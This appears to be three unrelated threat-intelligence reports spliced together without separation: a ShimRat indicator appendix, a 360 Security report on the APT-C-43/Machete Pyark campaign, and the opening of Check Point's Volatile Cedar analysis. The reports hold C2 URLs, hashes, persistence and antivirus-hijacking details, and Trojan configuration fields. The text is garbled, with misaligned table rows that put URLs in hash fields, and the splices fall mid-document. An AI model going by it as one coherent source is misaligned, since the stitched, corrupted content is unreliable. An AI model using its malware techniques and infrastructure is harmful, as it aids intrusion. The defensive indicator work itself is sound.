ShimRat core Filename(s) - Related campaign - Proxy HTTP=150.207.1.67:80 C2 URL http://video.today-nytimes.com/en-us/b/index.php MD5 f4b247a44be362898c4e587545c7653f SHA256 558461b6fb0441e7f70c4224963490ea49f44d40c5700a4c7fd19be4c62b3d6a ShimRat core Filename(s) vmware-vmx.exe Related campaign - C2 URL http://www.goodlook.sg/po/index.php MD5 e79b2d2934e5525e7a40d74875f9d761 SHA256 a835baa7ffc265346443b5d6f4828d7221594bd91be8afc08152f3d68698b672 ShimRat core ShimRat core loader DLL Filename(s) msvcr110.dat Filename(s) msvcr110.dll Related campaign “Citrix lure”, see section 6.3 C2 URL https://api.officeonlinetool.comindex.php MD5 6b126cd9a5f2af30bb048caef92ceb51 MD5 4e493a649e2b87ef1a341809dab34a38 SHA256 2653ecc3ea17e0d5613ddebe76bdddea6c108713330b0bd8e68d2d5141a4a07d SHA256 2d40ca005a7df46b3f7c691006c9951fc3bee25bb4fa4a0ebbdee76d7d117fdf  ShimRat core ShimRat core loader DLL Filename(s) elogger.dat Filename(s) elogger.dll Related campaign “Global campaign”, see section 6.4 C2 URL https://ie.update-windows-microsoft.com/update/index.php MD5 d8b95e942993b979fb82c22ea5b5ca18 MD5 c27fb6999a0243f041c5e387280f9442 SHA256 af67df976fb941c99f4d3dd948ed4828a445dd6f9c98ffc2070c8be76c60484d SHA256 e5bcb55d7881b3b367521532af173e85d1eee66badf89586168d22ed17bc25b2 ShimRat core ShimRat core loader DLL Filename(s) elogger.dat Filename(s) elogger.dll Related campaign - C2 URL http://travel.tripmans.com/links/images/links.php MD5 23a1a7f0f30f18ba4d0461829eb46766 MD5 b4554c52f708154e529f62ba8e0de084 SHA256 d834e70a524a87945f7a8880b78f5e10460c1d2b60f3e487cb6f05c8221aa4f8 SHA256 0cc1660e384683f2147e02ff76c69822ee2b98433c3a3613bbd28b9d8258da38 ShimRat core ShimRat core loader DLL Filename(s) elogger.dat Filename(s) elogger.dll Related campaign “Myanmar”, see section 5 C2 URL http://dns.undpus.com/index.php MD5 8c85d527340a17d267379bcd9e5e5b1f MD5 26ff9e2da06b7e90443d6190388581ab SHA256 f71025d47105dcd674a0b9ef0c83a83854ba20cb0eb8168da36a7908d150e44f SHA256 5dc3f4a067ae125f99fa90844bba667235ec7ef667353e282ff29712dda5b71c  ShimRat core ShimRat core loader DLL Filename(s) elogger.dat Filename(s) elogger.dll Related campaign “Myanmar”, see section 5 C2 URL https://secure2.sophosrv.com/en-us/support/ms-cache_check.php MD5 3eb9d4c448cd5ec8cb49fa1e3b42b7d5 MD5 f34c6239b7d70f23ce02a8d207176637 SHA256 8ee3fc5ccef751e098c4e64b36e8b5c95dc48473ac83380b59d10ea32f9946f9 SHA256 35589ce27c27dd4407a79540f32031d752b774b4bd6b8a3687e19a177ae6b18b ShimRat core Filename(s) vmware-vmx.exe Related campaign “Global campaign”, see section 6.4 C2 URL https://ie.update-windows-microsoft.com/my/js/index.php MD5 2cc5bc69e24a13bfc8ea3dc679ab0efc SHA256 36422e6ccaa50a9ecceb7fb709a9e383552732525cb579f8438237d87aaf8377 ShimRat core ShimRat core loader DLL Filename(s) elogger.dat Filename(s) elogger.dll Related campaign - C2 URL http://www.tinroofpopcorn.com/admin/fckeditor/_samples/_plugins/samples.php MD5 a3f7895fae05fa121a4e23dd3595c366 MD5 5965731f2f237a12f7a4873e3e37658a SHA256 3c5c4d68d0fa6520637fb4afe6a7097ec7d0f1d6a738bb0064bb009ea6344e8d SHA256 a03bd56eeee9f376eb59c6f4d19bf8a651eeb57bb4ebb7f884192b22a6616e68 ShimRat core Filename(s) svchost.exe Related campaign - C2 URL http://update.nfkllyuisyahooapis.com/js/js/js.php MD5 f9c14a8e9ceb143d959743ad8c09fdc4 SHA256 b53b27bb3e9d02e3ec5404cf3e67debb90d9337dbb570ca8b8cfce1054428466  ShimRat core Filename(s) svchost.exe Related campaign - C2 URL http://www.go-gga.com/ez/doc/company/log/logon.php MD5 663e54e686842eb8f8bae2472cf01ba1 SHA256 ba0057a1b132ec16559efc832941455cc07f34c434da2a7434f73f1d2141bebf ShimRat core Filename(s) svchost.exe Related campaign “Myanmar”, see section 5 C2 URL http://www.commerce.gov.mm/templates/css1/logon.php MD5 a4da3b820883e9808bd3ca2e02437a25 SHA256 2b111e287d356ac4561ba4f56135b7c1361b7da32e5825028a5e300e44b05579 ShimRat core Filename(s) vmware-vmx.exe Related campaign - C2 URL http://www.ipacking.co.kr/ez/admin/data/403.php MD5 ca41c19366bee737fe5bc5008250976a SHA256 029e735581c38d66f03aa0e9d1c22959b0bc8dfe298b9e91b127c42c7f904b5e ShimRat core Filename(s) - Related campaign “MSME DEFEXPO”, see section 6.1 C2 URL http://images.defexpoindia14.com/se/index.php MD5 25e87e846bb969802e8db9b36d6cf67c SHA256 33b288455c12bf7678fb5fd028ff3d42fcaf33cf833a147cb7f0f89f7dad0d8f ShimRat core Filename(s) helpservice.exe Related campaign “Global Campaign”, see section 6.4 C2 URL http://update.micrdsoft.com/image/image.php MD5 cf883d04762b868b450275017ab3ccfa SHA256 eb2d3c9e15b189dd02f753f805e90493254e17d40db6f1228a4e4095c5f260c1  ShimRat core Filename(s) helpservice.exe Related campaign - C2 URL http://www.domesky.com/ez/admin/data/index.php MD5 06cca5013175c5a1c8ff89a494e24245 SHA256 5da5a5643e32d6200567768e6112d4d3161335d8d7a6dd48f02bf444fe98aab3 ShimRat core Filename(s) helpservice.exe Related campaign “MSME DEFEXPO”, see section 6.1 C2 URL http://images.defexpoindia14.com/se/index.php MD5 b281a2e1457cd5ca8c85700817018902 SHA256 241c66bb54bd27afeb4805aa8a8045155b81c8cd7093dde7ef19273728f502eb ShimRat core Filename(s) svchost.exe Related campaign “seg”, see section 6.2 C2 URL HTTP=proxy.seg.local:8080 MD5 http://support.f--secure.com/cache/cache.php SHA256 4e22e8bc3034d0df1e902413c9cfefc9 577622fbf0a7bebc60844df808e75eef81a3d62ec6943f80168ac0d5ef39de5c ShimRat core Filename(s) Update.exe Related campaign “Global campaign”, see section 6.4 C2 URL http://store.outlook-microsoft.net/en-us/c/index.php MD5 2f14d8c3d4815436f806fc1a435e29e3 SHA256 d2d4723f8c3bba910cade05c9ecea00cdcc647d42232bccc610d066792a95b15 ShimRat core Filename(s) vmware-vmx.exe Related campaign “Global campaign”, see section 6.4 C2 URL https://ie.update-windows-microsoft.com/company/js/index.php MD5 36e057fa2020c65f2849d718f2bb90ad SHA256 dae17755e106be27ea4b97120906c46d4fcbb14cc8d9fc2c432f4c0cc74bb3fb  ShimRat core Filename(s) lexplore.exe Related campaign “Global campaign”, see section 6.4 C2 URL http://b.support.outlook-microsoft.net/en-us/b/index.php MD5 3dab6ff3719ff7fcb01080fc36fe97dc SHA256 23132f4dfd4cb8abe11af1064e4930bc36a464d1235f43bad4ff20708babcc34 ShimRat core Filename(s) svchost.exe Related campaign - C2 URL http://www.domesky.com/ez/admin/data/index.php MD5 a326e2abacc72c7a050ffe36e3d3d0eb SHA256 fa28559a4e0e920b70129cea95a98da9a409eaa093c63f341a7809692b31e723 ShimRat core Filename(s) - Related campaign - C2 URL http://logon.had-one-job.com/2008/vcards/log/us/index.php MD5 d7a575895b07b007d0daf1f15bfb14a1 SHA256 234d62ffd83c3972a32e89685787ff3aab4548cd16e4384c3c704a059ef731ce ShimRat core Filename(s) - Related campaign “Global campaign”, see section 6.4 C2 URL http://store.outlook-microsoft.net/en-us/c/index.php MD5 888cac09f613db4505c4ee8d01d4291b SHA256 e01aae93f68a84829fd8c0bc5ae923897d32af3a1d78623839fcfd18c99627cc ShimRat core Filename(s) - Related campaign - C2 URL http://www.psychologia.uni.wroc.pl/sites/default/bm.php MD5 916a2a20a447b10e379543a47a60b40f SHA256 2a1a0d8d81647c321759197a15f14091ab5e76b913eb2d7d28c6bb053166d882  ShimRat core Filename(s) helpservice.exe Related campaign - C2 URL http://www.avgfree.us/index.php MD5 2384febe404ef48d6585f050e3cd51a8 SHA256 6882664f1d0eb8c8cf61bdd16494380d34b6207455638342c6c3a7eef1ed9197 ShimRat core Filename(s) svchost.exe Related campaign - C2 URL http://adventurelearning.me/wp-content/uploads/index.php MD5 484c7f9e6c9233ba6ed4adb79b87ebce SHA256 1922273bb36ab282e3b7846f1bb2802f5803bde66078fa996e44b84d0265675f ShimRat core Filename(s) - Related campaign - C2 URL HTTP=150.207.1.67:80 MD5 http://video.today-nytimes.com/en-us/b/index.php SHA256 f4b247a44be362898c4e587545c7653f 558461b6fb0441e7f70c4224963490ea49f44d40c5700a4c7fd19be4c62b3d6a ShimRat core Filename(s) - Related campaign “Global campaign”, see section 6.4 C2 URL http://mail.upgoogle.com/image/image.php MD5 5c00ccf456135514c591478904b146e3 SHA256 1ca75e9b1761e15968d01a6e4f0a9f6ce47ba7ee4047d1533fb838f0f6ab28e2  9.3 ShimRatReporter samples The following samples are the core ShimRatReporter samples.

Some of these were delivered in Zip archives or packaged in some form but those aren’t listed. These table blocks contain parsed configuration data for the samples, the domains listed here are also present separately in the Network ioc paragraph 2, but added here to give an overview and outline the relationship between the iocs. ShimRatReporter core Observed filename(s) vmware-vmx.exe Related campaign - Configured C2 domain www.ipacking.co.kr Configured C2 reporting gate http://www.ipacking.co.kr/ez/admin/data/403.php MD5 ca41c19366bee737fe5bc5008250976a SHA256 029e735581c38d66f03aa0e9d1c22959b0bc8dfe298b9e91b127c42c7f904b5e ShimRatReporter core Observed filename(s) photo.exe Related campaign - Configured C2 domain dns.undpus.com Configured C2 reporting gate http://dns.undpus.com/info.php Configured 2nd stage payload http://dns.undpus.com/myanmar.jpg MD5 9a6167cf7c180f15d8ae13f48d549d2e SHA256 b7edbe6aee1896a952fcce2305c2bb7d8e77162bb45e305c64c7f8c9f63b3ab5 ShimRatReporter core Observed filename(s) loader.exe Related campaign - Configured C2 domain dns.undpus.com Configured C2 reporting gate http://dns.undpus.com/info.php Configured 2nd stage payload http://dns.undpus.com/info.txt MD5 0067bbd63db0a4f5662cdb1633d92444 SHA256 ac3b42453fac93e575988ba73ab24311515b090d57b1ad9f27dcbae8363f2d99  ShimRatReporter core Observed filename(s) font.exe Related campaign - Configured C2 domain wbmail.city-library.com Configured C2 reporting gate http://wbmail.city-library.com/mm/news/info.php MD5 fb80354303a0ff748696baae3d264af4 SHA256 0741a18bfd79dac1fb850a7d4fcc62098c43fb0c803df6cd9934e82a1362dd07 ShimRatReporter core Observed filename(s) - Related campaign “Global campaign”, see section 6.4 Configured C2 domain ie.update-windows-microsoft.com Configured C2 reporting gate http://ie.update-windows-microsoft.com/load/uplogo.php Configured 2nd stage payload http://ie.update-windows-microsoft.com/load/logo.gif MD5 582e4adddfd12f7d68035c3b8e2e3378 SHA256 722f41aa2c7d670364b7a9bb683a0025aef5893b34af67873972cdaf09490ad2 ShimRatReporter core Observed filename(s) AlphaZawgyl_font.exe Related campaign “Myanmar”, see section 5 Configured C2 domain library.cpgcorp.org secure2.sophosrv.com Configured C2 reporting gate http://library.cpgcorp.org/links/images/file/blanks.php Configured 2nd stage payload http://library.cpgcorp.org/links/images/blanks.jpg https://secure2.sophosrv.com/en-us/support/blanks.jpg MD5 b43e5988bde7bb03133eec60daaf22d5 SHA256 7deb75e95e8e22c6abb3b33c00b47a93122b8c744e8f66affd9748292e5a177f49 9.4Antivirus hijacking components As described in section 7.2 the ShimRat malware uses certain antivirus product components that are vulnerable to dll hijacking in order to run.

The following tables contain all the indicators for these components. Keep in mind that these indicators are only useful indicators if the antivirus product the component comes from is not installed. Company Norman Application name Program Manager Version (product specific) 10.0.0.0 Hijacked DLL elogger.dll First seen used 2014-04-30 MD5 23a3f48df4b36e3d2e63cde4b85cf4fa SHA256 006c74c6813a6efeabea860b2718ed548eed216a319d76ceb178fc38cba458d1 Company McAfee Application name McAfee Oem Module Version (product specific) 2.1.0.0 Hijacked DLL mcutil.dll First seen used 2015-03-15 MD5 884d46c01c762ad6ddd2759fd921bf71 SHA256 3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe Company Symantec Application name Norton Identity Safe Version (product specific) 2015.2.1.5 Hijacked DLL msvcr110.dll First seen used 2015-09-07 MD5 1f330f00510866522f14790398a5be59 SHA256 33fff13b0d0e76a09100efa0b407fe8cdfd0758500dad7cc59722bf3b537de62  9.5 Observed services As explained in paragraph 7.1.3, ShimRat can become persistent through the use of services. The configuration of the service which includes the service name, title and description is configured inside the individual ShimRat samples. The list below are uniquely observed service configurations. Correlating these with the actual process the service starts, is a good indicator of the presence of ShimRat.

Service name WWebLogic Service title Windows WebLogic Service Service description DHCP service for windows networks.Provides Windows DHCP Net foundation frame support ,through the framework, on servers that are also running the service. Service name WNetDHCP Service title Windows DHCP Service Service description DHCP service for windows networks.Provides Windows DHCP Net foundation frame support ,through the framework, on servers that are also running the service. Service name helpservices Service title Windows Help Services Service description Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable. Service name mshelpsrvs Service title Windows Help Services Service description Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable. Service name mshelpsrvsv Service title Windows Help Services Service description Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable.

Service name mshelplog Service title Windows Help log Service description Enables Help and Support Center to run on this computer. If this service is stopped, Help and Support Center will be unavailable. Service name avp2015 Service title Kaspersky protect service Service description Kaspersky protect service 9.6 Observed shims As discussed in paragraph 7.1.4, ShimRat can obtain persistence on systems by installing shims. The following table contains the settings for these shims and some observed hashes. Checking for the configurations of these shims will be more effective than just checking the listed hashes. Platform x86 Name Clengine_Shim Application name Clengine_Apps Database name Clengine_Database Type of fix InjectDLL Injection target svchost.exe Injection DLL elogger.dll Database GUID {503ec3d3-165a-4770-b799-099d43b833ec} Exe GUID {e8cc2eb5-469c-43bd-9d69-de089e497302} MD5 cacbdf48a61ee0999da003f090027598 SHA256 7c8f962129f9d8fef6df7ca29ee7672c30286660298e0ef8b40f6a17f029187f Platform x64 Name Clengine_Shim Application name Clengine_Apps Database name Clengine_Database Type of fix InjectDLL Injection target svchost.exe Injection DLL eloggerx64.dll Database GUID {f8c4cc07-6dc4-418f-b72b-304fcdb64052} Exe GUID {7feee735-1296-4c40-bdd4-7d4f09acc2d0} MD5 5f287a8082df8ed7b081137507c03638 SHA256 286616a5124f57f165ba2a1aa540200e103e976ce181dd61fe39faf05cf5378d  fox-it Was founded in 1999.

Established one of the first Cyber Security Operations Centers in Europe. Is Europe’s largest specialized cyber security company. Operates in three business areas: 1 Cyber Threat Management: a solution portfolio aimed at reducing the risks of cyber threats, and includes: professional services, managed security services, and technology; 2 Web and Mobile event analytics: a solution portfolio that is aimed at reducing financial risks in (online) payment transactions; 3 High Assurance: solutions that make trusted communication possible to the highest classification levels. Has been involved in many high-profile Incident Response cases. Most of the cases we worked on are secret. An approved selection can be shared upon request.

In June 2020, 360 Security Center discovered a new backdoor Pyark written in Python by the fileless attack protection function. Through in-depth excavation and trace analysis of the backdoor, we discovered a series of advanced threat actions that have been active since 2019. By invading various military institutions in Venezuela, the attackers deployed backdoor to continuously monitor and steal the latest military secrets. We named it APT-C-43 based on 360’s way of naming the APT organization

When tracing the attacker’s source, we found that the duration of this attack coincided with the Venezuelan political chaos, and the network assets used by the attackers were mostly deployed in Colombia, and some assets were frequently found in Venezuela and Colombia. After the United Venezuelan coup, the reactionary government headed by Juan Gerardo Guaidó Márquez fled to Colombia to seek military assistance. We guess the political background of APT-C -43’s campaign may be to help the reactionaries led by Juan steal military secrets of the Venezuelan military and provide intelligence support for the confrontation between the reactionary government and the current Venezuelan government.

Therefore, we named this series of attacks HpReact. In the process of tracing the source, the campaign was linked to the APT group Machete, and Machete can be traced back to 2010. The organization is an APT organization with Spanish roots. Its targets are military, embassies and government agencies in Latin America. the Lord. Obviously, the HpReact campaign is only a small part of the organization’s cyber warfare in Latin America. The picture below shows the decoy document used by APT-C-43 in this campaign. The content of the document is a policy issued by the Venezuelan authorities to prevent deserters from going to Colombia to support the reactionary government. More about this policy. For details, please refer to Appendix 1. It can be seen that the attackers have a good understanding of Venezuela’s current politics, military, etc., and are good at using such sensitive files to make decoy documents, which are highly targeted and inductive.

Technical Details
The APT-C-43 organization is good at launching attacks using phishing emails, and deploys the backdoor program Pyark (Machete) written in python after invading the victim’s machine. The network communication mainly relies on FTP and HTTP protocols. After successfully infiltrating the target machine, APT-C-43 organization monitors the target users, steal sensitive data, etc. The complete process of infecting the target machine is as follows:



 

The infection process
The decoy document carries malicious macrocode. Download the next stage of malicious component NisSrv.bat through FTP protocol, and we can see many variables named after Spanish vocabulary in the code, such as servidor (server), Usuario (user name), Contraseña (password), etc.:



 

NisSrv.bat downloads malicious components:



The file of “setupXOX.msi” is a Windows Installer installation program made by MSI Wrapper to deploy the final backdoor components. When we studied the historical samples of the Machete organization, we found that the organization’s technology for deploying backdoor has undergone an important change, with a clear time division.

Through the following timeline, we can clearly see that the organization is constantly changing and innovating its own Attack technique:



Many fields in the installation program are forged into Acrobat Reader installation program, and the interface after running is related to Acrobat Reader:



After the program runs, the Fpyark backdoor components will be released to the %ProgramData%\USOEnable directory. The backdoor of Fpyark is writing by python. During the running process, python is required to execute the environment and various dependent libraries required by the script, which also caused the size of setupXOX.msi to reach 8.10M. After installation, the entire directory structure is as follows:



After deploying the above backdoor components, run svchostt.exe according to the msiwpper configuration file:



The file of “setupXOX.msi” is a virus releaser written in Microsoft Visual Basic language, which releases NisSrv.bat registered scheduled tasks to realize self-starting and staying. The program has the following vbp compilation path:

@*\AC:\Users\MITM\Desktop\malware\3_svchostt\Proyecto1.vbp

The relevant code is as follows:



Backdoor module
UpdateSession is the main control module of the backdoor.

Its functions include self-starting of the backdoor, collection of network configuration, keystroke records, and schedule other modules to execute by means of timers:



UpdateService traverses the disk directory and collects more than ten kinds of sensitive files with suffixes such as doc, xlsx, and pdf in other directories, except for some system directories and security software directories. UpdateDevice takes screenshot



Capture camera screen:



UpdatePlugin takes audio from the microphone:



Notification is responsible for uploading the sensitive data collected by the above modules to the FTP server:



The interactive traffic characteristics are as follows:



When analyzing the uploaded FTP server, we found that APT-C-43 manages the uploaded sensitive files through Tiny File Manager:



Summary
The entire campaign of HpReact highly coincides with the timeline of Venezuelan political turmoil. APT-C-43 took Venezuelan military agencies as the main targets and carried out surveillance and stealing activities for about two years, forming a significant impact on Venezuela’s national security.

Great safety hazard. In recent years, with the intensification of cyber warfare in various countries, cyberspace security has become another important area for each country to maintain national security, and building a strong cybersecurity has become a top priority for each country. At present, 360 Total Security has supported the detection of attacks on this organization. Team Introduction
360 Baize Lab (formerly 360 FirstAid team): Focusing on BOOTKIT/ROOTKIT Trojan analysis and traceability, it was the first to discover the world’s first UEFI Trojan Spy Shadow（UEFI木马谍影），boot area Trojan Hidden Soul（引导区木马隐魂），dual guns（双枪,）and multiple large-scale dark brush botnets, such as black fog and diaster. Now it is renamed 360 Baize Lab based on the original business, it is involved in APT testing and research. The laboratory provides core safety data for 360 Security Guards, 360 FirstAid team and other products, as well as stubborn Trojan detection and killing solutions, while providing 360 Security Center Technical Support.

Appendix 3
MD5:

fbe5b66db57fb52b231c5374ac2ac805

6b33fa0c52ca413d4214dcde007f89c1

f85489c1d1ff3374f92ccb7267032016

IP:

92.249.44.53

185.70.105.33

VOLATILE CEDAR THREAT INTELLIGENCE AND RESEARCH MARCH 30, 2015
TABLE OF CONTENTS EXECUTIVE SUMMARY Beginning in late 2012, a carefully orchestrated attack campaign we call Volatile Cedar has been targeting individuals, companies and institutions worldwide. This campaign, led by a persistent attacker group, has successfully penetrated a large number of targets using various attack techniques, and specifically, a custom-made malware implant codenamed Explosive. This report provides an extended technical analysis of Volatile Cedar and the Explosive malware. Malware attribution is often tricky and deception-prone. With that in mind, investigation of the evidence leads us to suspect Volatile Cedar originates from Lebanon (hence its nickname). Moreover, the Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers. We have seen clear evidence that Volatile Cedar has been active for almost 3 years. While many of the technical aspects of the threat are not considered “cutting edge”, the campaign has been continually and successfully operational throughout this entire timeline, evading detection by the majority of AV products.
This success is due to a well-planned and carefully managed operation that constantly monitors its victims’ actions and rapidly responds to detection incidents. Volatile Cedar is heavily based on a custom-made remote access Trojan named Explosive, which is implanted within its targets and then used to harvest information. Tracking down these infections was quite a difficult task due to the multiple concealment measures taken by the attackers. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled and deployed specifically for certain targets, and ”radio silence” periods are configured and embedded specifically into each targeted implant. The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism. We will discuss the attack vectors and infection techniques used by the attack campaign as well as provide indicators that can be used to detect and remove the infection. For hashes, domains, IP addresses and other indicators of compromise, see Appendix C. Some of the details in this investigation were edited or omitted from this report to protect customer privacy and ongoing research efforts.
Further information may be released in future reports. OVERVIEW Volatile Cedar is a highly targeted and very well-managed campaign. Its targets are carefully chosen, confining the infection spread to the bare minimum required to achieve the attacker’s goal while minimizing the risk of exposure. Our analysis leads us to believe that the attackers conduct a fair amount of intelligence gathering to tailor each infection to its specific target. The campaign's initial targets are mostly public web servers, running the Windows operating system. We believe this is because these servers serve as publicly exposed, easily accessible gateways to private and more secure internal networks. As these servers have a common business functionality, their security is often sacrificed for productivity, making them an easy target for attackers. Once the attacker gains control over these servers, he can use them as a pivot point to explore, identify, and attack additional targets located deeper inside the internal network. The typical Volatile Cedar attack begins with a vulnerability scan of the target server.
Once an exploitable vulnerability is located, it is used to inject a web shell code into the server. The web shell is then used by the attacker to control the victim server and is the means through which the Explosive Trojan is implanted into the victim server. This Trojan allows the attackers to send commands to all targets via an array of C&C servers. The command list contains all the functionality required by the attacker to maintain control and extract information from the servers and includes keylogging, clipboard logging, screenshots, run commands, etc. Occasionally, mostly in cases where large data extractions are required, the attacker sets up additional SSH tunnels connecting to the attacker-controlled servers. ATTACK TIMELINE The first evidence of any Explosive version was detected in November 2012. Over the course of the timeline, several versions have been detected. New version release dates appear to be closely related to the occurrence of an AV detection event on the previous version, a fact which emphasizes the efforts taken to conceal the attack. The latest Explosive version was released in June 2014 and is still active at the time of this publication.
See the figure below for more details. Figure 1 - Explosive version timeline STEALTH The Explosive Trojan goes to a lot of effort to hide from common detection tools and merge into its surroundings. AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. See Figure 1. New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes. Once Explosive’s memory consumption reaches a predefined threshold, its hosting process is immediately restarted. API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. This enables the attackers to make sure that heuristic detections do not lead to exposure of the Trojan logic itself. Custom configurations are set on a per target basis. For example, each Trojan configuration contains periods of “radio silence” during which Explosive does not initiate any network communication.
These periods are set according to the specific target’s working hours and low traffic periods. Obfuscated C&C communication may appear as random network traffic “noise” to certain network inspection devices. A dedicated thread makes periodic “secure checks” with the C&C server to confirm that it is safe to operate. Once the response to these checks is negative, the Explosive Trojan ceases all operations until instructed otherwise. CONTROL NETWORK The campaign uses a multi-tiered server backend framework to control the targeted systems. This backend framework is composed of 3 major tiers: Tier 1—C&C servers: Each Explosive Trojan attempts to connect to its C&C servers, which are used to send commands and receive information extracted from the targets. Each Explosive version has a default hardcoded C&C address. Different versions use different C&C servers. Tier 2—Static update servers: These servers are periodically connected to obtain the current C&C address. If a new C&C address is available, the default C&C server is updated with the new one.
The static C&C updater address is also hardcoded as part of the Explosive configuration section. Tier 3—Dynamic update servers: If the static C&C server is nonresponsive, the Explosive infection initiates a custom DGA algorithm which attempts to connect to the dynamic update servers. Once connected, these servers operate the same way as the static updaters. Some Explosive versions also use the dynamic update servers as their C&C servers. The server framework is diverse. While some servers are owned (and possibly also hosted) by the attackers, other servers use publicly shared hosting frameworks or even compromised legitimate servers. Table 1 - Explosive server infrastructure INFECTION SPREAD Evidence shows that the Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers. Additionally, residues of custom-built port scanners and several other attack tools have been found on the victim servers, leading us to believe the attackers use the initially infected servers as a pivot to manually spread to the entire network. More recent versions of the Explosive Trojan contain a configurable option for USB infection.
When this option is enabled, Explosive infects any writable mass storage device connected to the server. This can be used to infect additional servers in environments where operational mass storage devices are shared between servers, as well as infect an administrator’s home or office machines. For additional information on the USB infection process, see Appendix B. ATTRIBUTION Malware attribution has always been a difficult task and Volatile Cedar is no different. Although we have no hard evidence upon which to base our conclusions, and many of the factors we rely on can in theory be forged or misinterpreted, we believe the unique combination of these factors reveal the attacker’s agenda and provide a good estimation of his whereabouts. 1. To assign a rough geographical location, we observed the UTC creation times of detected samples. The results can be seen in the following table: Figure 2 - Explosive sample UTC compilation hours With conventional working hours usually between 08:00-17:00, the creation locale time can be comfortably correlated to GMT+2. 2.
To further align our results, we took into account several other factors collected from the C&C server infrastructure: The C&C servers for the first Explosive version were hosted at a major Lebanese hosting company. This is not commonly seen in the malware arena. DNS registrant information from several of the infrastructure servers shows that they are or were previously registered under contacts with a very similar Lebanese address. Careful observation ofDNS registrant contact information history has revealed an OPSEC failure by the attackers in one instance. For a brief period (possibly before the server was operational), WHOIS privacy was inactive, pointing at a real identity of the registrant. This e-mail address leads to social media accounts that show public and clear affinity with Lebanese political activism. While not all of the targets have been identified yet, we can start building a profile of the intended victims. Some of the confirmed targets can be associated with organizations related to the state of Israel, and some are Lebanon-based, potentially testifying to in-state espionage among rival political groups. Other factors to consider are the low infection rate and the targeted nature of this campaign.
These suggest that the attacker’s motives are not financial but aim to extract sensitive information from the targets.The combination of these factors leads us to believe that the attack originated or is sponsored by groups affiliated with Lebanon and the specific targets are chosen based on nation-state/political-group interests. EXPLOSIVE ANALYSIS The Explosive Trojan contains 2 major components: The main executable binary A DLL file containing “backend” API calls The main executable file contains most of the Trojan logic, while the DLL primarily contains exported actionable API functions. The Explosive DLL file is dynamically loaded by the main executable at runtime whenever it is needed, and unloaded when the desired action is complete. This separation is probably designed to support quick functionality patches by the attackers, and to avoid heuristic detection of the main executable by common AV engines and other protection software. Exported DLL Function Description Version CON Main communication API.
All GetAllData Collect extensive data from user, OS and applications. All GetIEHistory Get Internet Explorer's history of browsing data. All OpenClipFn OpenClipboard wrapper. 3 PathProcess Locate and kill currently loaded Explosive modules. All SetWinHoK Wrapper around SetWindowsHookExA. All Registerapp Write Explosive registry values. All CreateNewFile Create a new Explosive instance on external mass storage device. 1, 2 Fdown URLDownloadToFile wrapper. 1 Table 2 - Common Explosive DLL functions Both the main executable and the DLL are compiled as a standard VC++ application. The main executable is a console application which supports several optional command-line arguments used to control the Trojan’s behavior: Option Function -i Install the Explosive Trojan as a service. The service is usually created with a blank description. -h \ -x Force the Explosive Trojan to a 20 second delay on startup. -d Stop the Explosive process, and remove all traces of infection from the system. Table 3 - Optional command line options Once installed, the Explosive Trojan creates several threads to support its functionality: Thread # Description Key Logger A basic implementation of a Windows key logger using the SetWindowsHookEx API call. Clipboard Logger Logs all clipboard data implemented by periodically opening and peeking into the current user clipboard data. Memory Monitor Constantly monitors Explosive’s memory consumption by calling the GetProcessMemoryInfo API and reading WorkingSetSize. C&C Secure Checks Periodically connects to the C&C server with a special connection string, and determines if the connection is secure by the return of a predefined value.
If the connection is not secure, all operations are stopped until a secure connection is achieved. Table 4 - Main explosive threads EXPLOSIVE VERSIONS Over the entire attack timeline, we detected 5 different versions of Explosive: Explosive Version Description Version 1 Un-obfuscated network traffic. Version 2 Most common version, clipboard monitoring added. Version 3 Most advanced version detected. KS Version Uses only keyboard and clipboard hooking modules. Micro Possible ancestor. Uses the same C&C server framework. Table 5 - Explosive versions The earliest version of Explosive is version 1, and the first sample compiled is dated to November 2012. This version includes very basic backdoor features. C&C communication is not obfuscated. The default C&C server is no longer active, and we believe no infections of this version are currently active. Version 2 and Version 3 are more mature implementations of the Explosive Trojan, with added concealment and operational features as well as a new set of supported actions for C&C commands. The KS version is very similar in functionality to other Explosive versions.
However, this version has no communication functionality and is most probably used by the attackers to avoid network detection in special cases. This version stores the extracted server data on the server's file system to be downloaded later by the attacker using the pre-installed web shell. Micro seems to be an early ancestor of the Explosive Trojan. Only a few samples of it were detected. Micro does not use the same C&C server or protocol as the other versions, but uses the “dynamic updater” framework to pass commands via HTTP. For more details of the Micro version, see Appendix A. CONFIGURATION Each of the main Explosive binary files contains an integrated configuration section, which is located at a fixed position in the binary image overlay. The configuration section itself is not encrypted but the readable configuration values are stored as obfuscated strings. Figure 3 - Explosive Configuration Section As expected, the configuration section evolves with subsequent versions of Explosive, and newer versions present new configuration parameters. Parameter Name Description Version DLD-ACT Explosive constantly attempts to update its C&C IP address when this flag is set.
All DLD-C A unique identifier used for updating C&C communication. All DLD-C0 Same as DLD-C. All DLD-D URL for the static C&C updater. All DLD-E TLD of the dynamic C&C updater. All DLD-P Path for the dynamic C&C updater. All DLD-IHC No communication is generated during “silent mode” when this flag is set. 2, 3 DLD-IH1 Starting hour of “silent mode.” 2, 3 DLD-IH2 Ending hour of “silent mode.” 2, 3 DLD-PRT Default C&C Port. All DLD-IP Default C&C IP address. All DLD-OIP Other (additional) C&C IP addresses. 3 DLD-NTI Delay time between C&C connections. All DLD-RCH Registration related. 2, 3 DLD-RL Registration related. 2, 3 DLD-RN Registry key name. All DLD-S Initial value for dynamic C&C updating DGA. All DLD-SN Installed service name. 2, 3 DLD-ST Installed service type. 2, 3 DLD-TN Unique identifier for C&C communication. All DLD-USA Removable device infection method. All DLD-USI Removable device infection flag.
